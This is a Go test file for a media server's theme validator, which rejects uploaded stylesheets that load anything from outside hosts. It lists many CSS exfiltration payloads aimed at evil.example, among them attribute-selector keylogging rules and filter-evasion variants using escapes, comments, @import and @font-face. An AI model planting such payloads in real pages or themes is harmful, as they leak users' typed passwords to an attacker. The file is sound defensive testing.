// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 WittyWilla and contributors

package themes

import (
	"errors"
	"io/fs"
	"path/filepath"
	"testing"

	builtin "github.com/wittywilla/wittymediaserver/themes"
)

// A stylesheet that can load an image from elsewhere can read a page: one rule per
// character of a sign-in form's value, each with its own address, tells that site the
// password as it's typed. The page's policy has to allow images from the internet for
// artwork, so a theme is held to its own files.
func TestStylesheetCantReachOutside(t *testing.T) {
	for _, css := range []string{
		`input[value^="a"] { background: url(https://evil.example/a) }`,
		`input[value^="a"] { background: url("https://evil.example/a") }`,
		`input { background: URL('HTTPS://evil.example/a') }`,
		`input { background: url(http://evil.example/a) }`,
		`input { background: url(//evil.example/a) }`,
		`input { background: url("//evil.example/a") }`,
		`input { background: url(https:evil.example/a) }`,
		`input { background: u\72l(ht\74ps://evil.example/a) }`,
		`input { background: url(\68 ttps://evil.example/a) }`,
		`input { background: url("\000068ttps://evil.example/a") }`,
		`input { background: url("ht\
tps://evil.example/a") }`,
		`input { background: url("\2f\2f evil.example/a") }`,
		`input { background: url("/\\evil.example/a") }`,
		`input { background: url("\\\\evil.example/a") }`,
		`input { background: url("/\9 /evil.example/a") }`,
		`input { background: url(//*a.evil.example/*/x) }`,
		`input { background: url(/**/https://evil.example/a) }`,
		`input { background: image-set("https://evil.example/a" 1x) }`,
		`input { cursor: url(https://evil.example/a), auto }`,
		`input { background: /* "*/ url(https://evil.example/a) /* " */ }`,
		`@import "https://evil.example/a.css";`,
		`@font-face { font-family: x; src: url(https://evil.example/a) }`,
		`input { background: url("/*"); color: red; background: url("https://evil.example/a"); /* */ }`,
		// A string a browser ends at the line break, then a comment only in the eyes of a parser.
		"a{content:\"x\n}\nb{content:\"/*\"; background:url(https://evil.example/a); x:\"*/\"}",
		`a { content: xurl(a") /*" url(https://evil.example/a) /* }`,
		`/* see https://example.org */ a { color: red }`,
	} {
		if !outsideURL([]byte(css)) {
			t.Errorf("got through: %s", css)
		}
		data := zipOf(t, map[string]string{"theme.json": `{"name":"x"}`, "theme.css": css})
		if CheckZip(data) == nil {
			t.Errorf("accepted as a theme: %s", css)
		}
	}
	for _, css := range []string{
		`:root { --accent: #e50914; }`,
		`body { background: var(--bg) url("assets/backdrop.webp") center / cover fixed; }`,
		`@font-face { font-family: "C"; src: url("assets/fonts/C.woff2") format("woff2"); }`,
		`.brand img { content: url(assets/logo.svg); width: 36px; }`,
		`/* Made by someone */ /* in 2026 *//* with care */ :root { --bg: #000; }`,
		`.a { background: url("data:image/png;base64,iVBORw0KGgo=") }`,
		`.a { background: url("data:image/jpeg;base64,/9j//4AAQSk//Zg==") }`,
		`.a { background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'/%3E") }`,
		`@namespace svg url(http://www.w3.org/2000/svg);`,
		`.a { font: 12px/1.5 serif; grid-area: 1 / 2 / 3 / 4; }`,
	} {
		if outsideURL([]byte(css)) {
			t.Errorf("refused an ordinary stylesheet: %s", css)
		}
		// Rules for the interface's classes are refused on their own account (design_test.go);
		// what is left is held to the same rules as before.
		if checkVariablesOnly("theme.css", []byte(css)) != nil {
			continue
		}
		if err := CheckZip(zipOf(t, map[string]string{"theme.json": `{"name":"x"}`, "theme.css": css})); err != nil {
			t.Errorf("refused an ordinary theme: %v", err)
		}
	}
}

func TestEveryStylesheetInATheme(t *testing.T) {
	bad := zipOf(t, map[string]string{"theme.json": `{"name":"x"}`, "theme.css": `@import "more/other.css";`, "more/other.css": `a { background: url(https://evil.example/) }`})
	if CheckZip(bad) == nil {
		t.Error("a second stylesheet went unread")
	}
}

// The colours in theme.json become custom properties when the themes are listed.
func TestThemeJSONColoursCantReachOutside(t *testing.T) {
	for _, j := range []string{
		`{"name":"x","preview":{"bg":"url(https://evil.example/)"}}`,
		`{"name":"x","colors":{"bg":"url(//evil.example/)"}}`,
	} {
		if CheckZip(zipOf(t, map[string]string{"theme.json": j, "theme.css": ":root{}"})) == nil {
			t.Errorf("accepted: %s", j)
		}
	}
	if err := CheckZip(zipOf(t, map[string]string{"theme.json": `{"name":"x","homepage":"https://example.org","preview":{"bg":"#102030"},"colors":{"bg":"rgb(1 2 3)"}}`, "theme.css": ":root{}"})); err != nil {
		t.Errorf("an ordinary theme.json: %v", err)
	}
}

// One from an earlier version, or put in the folder by hand, isn't served either.
func TestStylesheetFromBeforeTheRuleIsntServed(t *testing.T) {
	dir := t.TempDir()
	m := &Manager{Dir: dir}
	data := zipOf(t, map[string]string{"theme.json": `{"name":"x"}`, "theme.css": `a { background: url(https://evil.example/) }`, "logo.png": "x"})
	if err := writeAtomic(filepath.Join(dir, "old.zip"), data); err != nil {
		t.Fatal(err)
	}
	if _, _, err := m.File("old", "theme.css"); !errors.Is(err, ErrNotFound) {
		t.Errorf("served: %v", err)
	}
	if _, _, err := m.File("old", "logo.png"); err != nil {
		t.Errorf("its other files are harmless: %v", err)
	}
}

func TestBuiltinThemesStayInside(t *testing.T) {
	dirs, err := fs.ReadDir(builtin.Builtin, ".")
	if err != nil {
		t.Fatal(err)
	}
	for _, d := range dirs {
		if !d.IsDir() {
			continue
		}
		b, err := fs.ReadFile(builtin.Builtin, d.Name()+"/theme.css")
		if err != nil {
			t.Fatal(err)
		}
		if outsideURL(b) {
			t.Errorf("%s reaches outside", d.Name())
		}
	}
}

func TestMadeThemeStillWorks(t *testing.T) {
	m := &Manager{Dir: t.TempDir()}
	colors := map[string]string{}
	for _, k := range customVars {
		colors[k] = "#336699"
	}
	meta, err := m.AddCustom(Custom{Name: "Mine", Scheme: "dark", Colors: colors, Radius: 8})
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := m.File(meta.ID, "theme.css"); err != nil {
		t.Error(err)
	}
}
